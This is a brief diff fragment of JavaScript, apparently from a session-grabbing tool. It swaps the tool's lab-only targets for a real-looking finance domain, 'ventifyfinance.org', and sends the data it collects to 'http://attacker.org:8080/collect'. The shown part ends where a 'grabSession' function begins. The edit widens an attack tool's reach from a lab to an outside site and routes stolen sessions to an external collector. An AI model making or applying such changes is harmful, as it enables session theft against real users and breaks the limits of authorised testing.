@@ -1,5 +1,5 @@
-const LAB_HOSTS = ["portal.lab.local", "172.20.10.7"];
-const COLLECTOR = "http://172.20.10.7:8080/collect";
+const LAB_HOSTS = ["ventifyfinance.org", "attacker.org"];
+const COLLECTOR = "http://attacker.org:8080/collect";
 
 async function grabSession(host) {
   const url = `http://${host}/`;
